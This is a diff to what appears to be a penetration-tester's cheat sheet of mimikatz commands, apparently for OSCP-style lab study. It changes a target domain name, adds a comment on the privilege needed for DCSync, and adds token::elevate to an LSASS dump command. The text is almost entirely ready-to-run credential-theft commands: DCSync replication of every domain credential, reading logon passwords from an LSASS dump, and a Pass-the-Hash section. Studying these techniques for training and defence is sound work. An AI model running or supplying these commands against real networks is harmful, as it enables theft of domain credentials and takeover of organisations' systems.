@@ -100,7 +100,7 @@ token::elevate
   
 # Perform DCSync attack to dump domain credentials remotely  
 .\mimikatz.exe "token::elevate" "lsadump::dcsync /domain:<DomainFQDN> /all" "exit"
-.\mimikatz.exe  "token::elevate" "lsadump::dcsync /domain:oscp.exam /all" "exit"
+.\mimikatz.exe  "token::elevate" "lsadump::dcsync /domain:ad.trilocor.local /all" "exit"
 
 ########################################  
 # Pass-the-Hash attack  
@@ -142,7 +142,7 @@ token::elevate
 ########################################  
 # DCSync (replicate AD password database)  
 ########################################  
-  
+# If we have the privilege "Replicating Directory Changes" we can execute the DCSync attack:  
 # Replicate domain credential data from domain controller  
 .\mimikatz.exe  "token::elevate" "lsadump::dcsync /domain:<DomainFQDN> /all" "exit"
 
@@ -191,7 +191,7 @@ token::elevate
 .\mimikatz.exe "sekurlsa::minidump c:\temp\lsass.dmp" "exit"  
   
 # Load LSASS dump for analysis  
-.\mimikatz.exe "sekurlsa::minidump c:\temp\lsass.dmp" "sekurlsa::logonpasswords" "exit"  
+.\mimikatz.exe "token::elevate"  "sekurlsa::minidump c:\temp\lsass.dmp" "sekurlsa::logonpasswords" "exit"  
   
   
 ########################################  
